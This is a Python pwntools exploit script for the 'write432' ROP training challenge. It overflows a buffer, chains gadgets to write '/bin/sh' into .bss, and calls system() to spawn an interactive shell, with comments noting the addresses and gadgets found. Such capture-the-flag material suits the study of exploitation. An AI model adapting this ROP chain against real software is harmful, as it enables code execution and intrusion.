from pwn import *

#readelf -S write432
#[26] .bss              NOBITS          0804a040 001030 00002c
#08048430 <system@plt>:

# ROPgadget --binary write432 --only "mov|pop|ret"
# Gadgets information
# ============================================================
# 0x08048670 : mov dword ptr [edi], ebp ; ret
# 0x080486da : pop edi ; pop ebp ; r

p = process("./write432")
junk = "A" * 44
sys_addr = p32(0x8048430)
bss_addr = 0x804a040
ret = p32(0xdeadbeef)

mr = p32(0x8048670)
ppr = p32(0x80486da)

payload = junk + ppr + p32(bss_addr) + "/bin" + mr +\
          ppr + p32(bss_addr + 4) + "/sh\x00" + mr +\
          sys_addr + ret + p32(bss_addr)

p.recvuntil('> ')
p.sendline(payload)

p.interactive()
